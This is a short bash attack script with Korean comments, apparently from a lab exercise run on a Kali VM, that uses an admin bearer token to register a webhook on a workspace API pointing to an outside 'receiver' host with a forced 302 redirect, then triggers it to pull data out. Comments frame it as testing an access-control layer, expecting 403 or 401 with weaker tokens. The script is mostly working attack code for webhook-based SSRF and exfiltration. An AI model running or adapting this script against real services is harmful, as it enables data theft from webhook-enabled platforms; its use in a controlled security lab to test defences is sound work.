#!/usr/bin/env bash
# 칼리 VM 에서: ./attack-mlflow.sh [토큰]
#   인자 없으면 기본 lab-alice-token(admin, 공격 성공 케이스) 사용.
#   3계층(접근 제어) 테스트용: ./attack-mlflow.sh lab-viewer-token (403 기대), ./attack-mlflow.sh invalid-token-xxxx (401 기대)
set -euo pipefail
BASE="http://webhook:8000"
TOKEN="${1:-lab-alice-token}"   # 인자 없으면 기본 alice(admin) 토큰 사용
WORKSPACE="alpha"
RUN_ID="$(python3 -c 'import uuid;print(uuid.uuid4())')"
echo "RUN_ID=$RUN_ID"
echo "사용 토큰: $TOKEN"

HTTP_STATUS=$(curl -s -o /tmp/reg.json -w "%{http_code}" -X POST "$BASE/api/workspaces/$WORKSPACE/hooks" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d "{\"name\":\"mlflow-attack\",\"url\":\"https://receiver:8443/redirect?status=302\",\"events\":[\"model.registered\"],\"run_id\":\"$RUN_ID\"}")

echo "hook 등록 응답 코드: $HTTP_STATUS"
python3 -m json.tool /tmp/reg.json 2>/dev/null || cat /tmp/reg.json

if [ "$HTTP_STATUS" != "200" ] && [ "$HTTP_STATUS" != "201" ]; then
  echo
  echo "### 공격 중단: hook 등록 단계에서 차단됨 (HTTP $HTTP_STATUS) ###"
  echo "### 3계층(접근 제어)에 의해 공격 체인이 초입에서 막혔습니다 — 데이터 유출 없음 ###"
  exit 1
fi

HOOK_ID=$(python3 -c "import json;print(json.load(open('/tmp/reg.json'))['id'])")
echo "hook 등록 성공 (id=$HOOK_ID) — 공격 계속 진행"

curl -s -X POST "$BASE/api/workspaces/$WORKSPACE/hooks/$HOOK_ID/test" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d "{\"event\":\"model.registered\",\"run_id\":\"$RUN_ID\"}" | python3 -m json.tool
